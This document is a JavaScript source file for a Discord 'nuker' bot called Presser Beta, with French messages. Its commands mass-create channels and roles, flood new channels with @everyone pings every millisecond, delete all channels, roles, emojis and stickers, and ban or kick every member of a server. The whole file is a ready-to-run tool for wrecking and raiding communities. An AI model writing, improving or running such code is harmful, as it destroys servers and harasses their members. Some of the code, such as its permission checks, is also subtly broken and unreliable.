
const { Client, Intents, MessageEmbed } = require("discord.js");
const nuker = new Client({ intents: Object.values(Intents.FLAGS).reduce((a, b) => a + b) });
const { red, greenBright, cyan, yellow } = require("chalk");
const { token, prefix, userID, disableEveryone } = require("../config/config.json")

nuker.on("ready", () => {
    console.clear();
    console.log(red(`
    
        $$\      $$\                                         
        $$$\    $$$ |                                        
        $$$$\  $$$$ | $$$$$$\  $$\   $$\  $$$$$$\  $$\   $$\ 
        $$\$$\$$ $$ | \____$$\ \$$\ $$  |$$  __$$\ $$ |  $$ |
        $$ \$$$  $$ | $$$$$$$ | \$$$$  / $$ /  $$ |$$ |  $$ |
        $$ |\$  /$$ |$$  __$$ | $$  $$<  $$ |  $$ |$$ |  $$ |
        $$ | \_/ $$ |\$$$$$$$ |$$  /\$$\ \$$$$$$  |\$$$$$$  |
        \__|     \__| \_______|\__/  \__| \______/  \______/  
        Si il y a des erreurs contacter maxoulfr_ sur discord.
                                            
                                                      
                 Par 17Teen | Modif par Maxoulfr
                    Nuker: ${nuker.user.tag}
                    Prefix: ${prefix}
    `))
    nuker.user.setActivity({ name: "!help", type: "PLAYING" });
});

nuker.on("messageCreate", (message) => {

    // Embed !help | Refait entierement par Maxoulfr
    const help = new MessageEmbed()
    .setTitle("📜 **Aide - Presser Beta**")
    .setDescription("Voici la liste des commandes disponibles pour Presser Beta :")
    .addFields(
        { name: "🔹 Création massive de salons", value: `\`${prefix}mc [quantité] (texte)\`\nExemple : \`${prefix}mc 5 test\``, inline: false },
        { name: "🔹 Création massive de salons avec ping", value: `\`${prefix}cp [quantité] (texte), {message}\`\nExemple : \`${prefix}cp 5 test, message de test\``, inline: false },
        { name: "🔹 Création massive de rôles", value: `\`${prefix}mr [quantité] (texte)\`\nExemple : \`${prefix}mr 5 test\``, inline: false },
        { name: "🔹 Suppression des salons", value: `\`${prefix}dc\``, inline: false },
        { name: "🔹 Suppression des rôles", value: `\`${prefix}dr\``, inline: false },
        { name: "🔹 Suppression des émojis", value: `\`${prefix}de\``, inline: false },
        { name: "🔹 Suppression des stickers (nouveau)", value: `\`${prefix}ds\``, inline: false },
        { name: "🔹 Expulsion massive", value: `\`${prefix}mk\``, inline: false },
        { name: "🔹 Bannissement massif", value: `\`${prefix}mb\``, inline: false }
    )
    .setFooter(`© Presser Beta | Modifié par Maxou`)
    .setColor(0x5865F2)
    .setTimestamp();



    const channelPerms = message.guild.me.permissions.has("MANAGE_CHANNELS" || "ADMINISTRATOR");
    const banPerms = message.guild.me.permissions.has("BAN_MEMBERS" || "ADMINISTRATOR");
    const kickPerms = message.guild.me.permissions.has("KICK_MEMBERS" || "ADMINISTRATOR");
    const rolePerms = message.guild.me.permissions.has("MANAGE_ROLES" || "ADMINISTRATOR");
    const emotePerms = message.guild.me.permissions.has("MANAGE_EMOJIS_AND_STICKERS" || "ADMINISTRATOR");

    let args = message.content.split(" ").slice(1);
    var args1 = args[0];
    var args2 = args.slice(1).join(' ')
    var args3 = args.slice(2).join(', ');

    if (!disableEveryone) {
        if (message.content.startsWith(prefix + "help")) {
            message.channel.send({embeds: [help]})
        }

        if (message.content.startsWith(prefix + "mc")) {
            MassChannels(args1, args2).catch((err) => {
                message.reply(err);
            });
        }

        if (message.content.startsWith(prefix + "dc")) {
            DelAllChannels().catch((err) => {
                message.reply(err);
            });
        }

        if (message.content.startsWith(prefix + "cp")) {
            MassChnPing(args1, args2, args3).catch((err) => {
                message.reply(err);
            });
        }

        if (message.content.startsWith(prefix + "mr")) {
            MassRoles(args1, args2).catch((err) => {
                message.reply(err);
            });
        }

        if (message.content.startsWith(prefix + "dr")) {
            DelAllRoles().catch((err) => {
                message.reply(err);
            });
        }

        if (message.content.startsWith(prefix + "ds")) {
            DelAllStickers().catch((err) => {
                message.reply(err);
            });
        }

        if (message.content.startsWith(prefix + "de")) {
            DelAllEmotes().catch((err) => {
                message.reply(err);
            });
        }

        if (message.content.startsWith(prefix + "mb")) {
            BanAll().catch((err) => {
                message.reply(err);
            });
        }

        if (message.content.startsWith(prefix + "mk")) {
            KickAll().catch((err) => {
                message.reply(err);
            });
        }
    } else {

        if (message.content.startsWith(prefix + "help")) {
            if (message.author.id != userID) return message.reply("Vous n'êtes pas autorisé à utiliser les commandes de cet outil.");
            message.channel.send({embeds: [help]})
        }

        if (message.content.startsWith(prefix + "mc")) {
            if (message.author.id != userID) return message.reply("Vous n'êtes pas autorisé à utiliser les commandes de cet outil.");
            MassChannels(args1, args2).catch((err) => {
                message.reply(err);
            });
        }

        if (message.content.startsWith(prefix + "dc")) {
            if (message.author.id != userID) return message.reply("Vous n'êtes pas autorisé à utiliser les commandes de cet outil.");
            DelAllChannels().catch((err) => {
                message.reply(err);
            });
        }

        if (message.content.startsWith(prefix + "cp")) {
            if (message.author.id != userID) return message.reply("Vous n'êtes pas autorisé à utiliser les commandes de cet outil.");
            MassChnPing(args1, args2, args3).catch((err) => {
                message.reply(err);
            });
        }

        if (message.content.startsWith(prefix + "mr")) {
            if (message.author.id != userID) return message.reply("Vous n'êtes pas autorisé à utiliser les commandes de cet outil.");
            MassRoles(args1, args2).catch((err) => {
                message.reply(err);
            });
        }

        if (message.content.startsWith(prefix + "dr")) {
            if (message.author.id != userID) return message.reply("Vous n'êtes pas autorisé à utiliser les commandes de cet outil.");
            DelAllRoles().catch((err) => {
                message.reply(err);
            });
        }

        if (message.content.startsWith(prefix + "ds")) {
            if (message.author.id != userID) return message.reply("Vous n'êtes pas autorisé à utiliser les commandes de cet outil.");
            DelAllStickers().catch((err) => {
                message.reply(err);
            });
        }

        if (message.content.startsWith(prefix + "de")) {
            if (message.author.id != userID) return message.reply("Vous n'êtes pas autorisé à utiliser les commandes de cet outil.");
            DelAllEmotes().catch((err) => {
                message.reply(err);
            });
        }

        if (message.content.startsWith(prefix + "mb")) {
            if (message.author.id != userID) return message.reply("Vous n'êtes pas autorisé à utiliser les commandes de cet outil.");
            BanAll().catch((err) => {
                message.reply(err);
            });
        }

        if (message.content.startsWith(prefix + "mk")) {
            if (message.author.id != userID) return message.reply("Vous n'êtes pas autorisé à utiliser les commandes de cet outil.");
            KickAll().catch((err) => {
                message.reply(err);
            });
        }
    }

    /**
     * @param {number} amount 
     * @param {string} channelName
     */
    function MassChannels(amount, channelName) {
        return new Promise((resolve, reject) => {
            if (!amount) return reject("Args non spécifiés : spécifiez le montant que vous souhaitez diffuser en masse sur les chaînes.");
            if (isNaN(amount)) return reject("Erreur de type : utilisez un nombre pour le montant");
            if (amount > 500) return reject("Erreur de montant : la taille maximale du canal de guilde est de 500 | Astuce : utilisez un nombre inférieur à 500");
            if (!channelPerms) return reject("Autorisations manquantes du robot : « MANAGE_CHANNELS »");
            for (let i = 0; i < amount; i++) {
                if (message.guild.channels.cache.size === 500) break;
                if (!channelName) {
                    message.guild.channels.create(`${message.author.username} était ici`, { type: "GUILD_TEXT" }).catch((err) => { console.log(red("Erreur trouvée: " + err)) })
                } else {
                    message.guild.channels.create(channelName, { type: "GUILD_TEXT" }).catch((err) => { console.log(red("Erreur trouvée: " + err)) })
                }
            }
            resolve();
        });
    }

    /**
     * @param {number} amount
     * @param {string} channelName
     * @param {string} pingMessage
     */
    function MassChnPing(amount, channelName, pingMessage) {
        return new Promise((resolve, reject) => {
            if (!amount) return reject("Args non spécifiés : spécifiez le montant que vous souhaitez diffuser en masse sur les chaînes.");
            if (isNaN(amount)) return reject("Erreur de type : utilisez un nombre pour le montant");
            if (amount > 500) return reject("Erreur de montant : la taille maximale du canal de guilde est de 500 | Astuce : utilisez un nombre inférieur à 500");
            if (!channelPerms) return reject("Autorisations manquantes du robot : « MANAGE_CHANNELS »");
            if (!pingMessage) return reject("Args non spécifiés : spécifiez le message que vous souhaitez mentionner en masse");
            for (let i = 0; i < amount; i++) {
                if (message.guild.channels.cache.size === 500) break;
                if (!channelName) {
                    message.guild.channels.create(`${message.author.username} était ici`, { type: "GUILD_TEXT" }).catch((err) => { console.log(red("Erreur trouvée: " + err)) }).then((ch) => {
                        setInterval(() => {
                            ch.send("@everyone " + pingMessage);
                        }, 1);
                    });
                } else {
                    message.guild.channels.create(channelName, { type: "GUILD_TEXT" }).catch((err) => { console.log(red("Erreur trouvée: " + err)) }).then((ch) => {
                        setInterval(() => {
                            ch.send("@everyone " + pingMessage);
                        }, 1);
                    });
                }
            }
            resolve();
        });
    }

    function DelAllChannels() {
        return new Promise((resolve, reject) => {
            if (!channelPerms) return reject("Autorisations manquantes du robot : « MANAGE_CHANNELS »");
            message.guild.channels.cache.forEach((ch) => ch.delete().catch((err) => { console.log(red("Erreur trouvée: " + err)) }))
            resolve();
        });
    }

    /**
     * @param {number} amount
     * @param {string} roleName
     */
    function MassRoles(amount, roleName) {
        return new Promise((resolve, reject) => {
            if (!amount) return reject("Unspecified Args: Specify the amount you wish to mass roles");
            if (isNaN(amount)) return reject("Erreur de type : utilisez un nombre pour le montant");
            if (!rolePerms) return reject("Autorisations manquantes du robot : « MANAGE_ROLES »");
            for (let i = 0; i <= amount; i++) {
                if (message.guild.roles.cache.size === 250) break;
                if (!roleName) {
                    message.guild.roles.create({ name: "nuked", color: "RANDOM", position: i++ }).catch((err) => { console.log(red("Erreur trouvée: " + err)) })
                } else {
                    message.guild.roles.create({ name: roleName, color: "RANDOM", position: i++ }).catch((err) => { console.log(red("Erreur trouvée: " + err)) })
                }
            }
        })
    }

    function DelAllRoles() {
        return new Promise((resolve, reject) => {
            if (!rolePerms) return reject("Autorisations manquantes du robot : « MANAGE_ROLES »");
            message.guild.roles.cache.forEach((r) => r.delete().catch((err) => { console.log(red("Erreur trouvée: " + err)) }))
        });
    }

    function DelAllEmotes() {
        return new Promise((resolve, reject) => {
            if (!emotePerms) return reject("Autorisations manquantes du robot : 'MANAGE_EMOJIS_AND_STICKERS'");
            message.guild.emojis.cache.forEach((e) => e.delete().catch((err) => { console.log(red("Erreur trouvée: " + err)) }))
        });
    }

    function DelAllStickers() {
        return new Promise((resolve, reject) => {
            if (!emotePerms) return reject("Autorisations manquantes du robot : 'MANAGE_EMOJIS_AND_STICKERS'");
            message.guild.stickers.cache.forEach((s) => s.delete().catch((err) => { console.log(red("Erreur trouvée: " + err)) }))
        });
    }

    function BanAll() {
        return new Promise((resolve, reject) => {
            if (!banPerms) return reject("Autorisations manquantes du robot : « BAN_MEMBERS »");
            let arrayOfIDs = message.guild.members.cache.map((user) => user.id);
            message.reply("Trouvé " + arrayOfIDs.length + " utilisateurs.").then((msg) => {
                setTimeout(() => {
                    msg.edit("Banning...");
                    for (let i = 0; i < arrayOfIDs.length; i++) {
                        const user = arrayOfIDs[i];
                        const member = message.guild.members.cache.get(user);
                        member.ban().catch((err) => { console.log(red("Erreur trouvée: " + err)) }).then(() => { console.log(greenBright(`${member.user.tag} a été ban.`)) });
                    }
                }, 2000);
            })
        })
    }
    
    function KickAll() {
        return new Promise((resolve, reject) => {
            if (!kickPerms) return reject("Autorisations manquantes du robot : « KICK_MEMBERS »");
            let arrayOfIDs = message.guild.members.cache.map((user) => user.id);
            message.reply("Trouvé " + arrayOfIDs.length + " utilisateurs.").then((msg) => {
                setTimeout(() => {
                    msg.edit("Kick...");
                    for (let i = 0; i < arrayOfIDs.length; i++) {
                        const user = arrayOfIDs[i];
                        const member = message.guild.members.cache.get(user);
                        member.kick().catch((err) => { console.log(red("Erreur trouvée: " + err)) }).then(() => { console.log(greenBright(`${member.user.tag} a été kick.`)) });
                    }
                }, 2000);
            })
        })
    }
});

try {
    nuker.login(token);
} catch (err) {
    console.error(err)
}
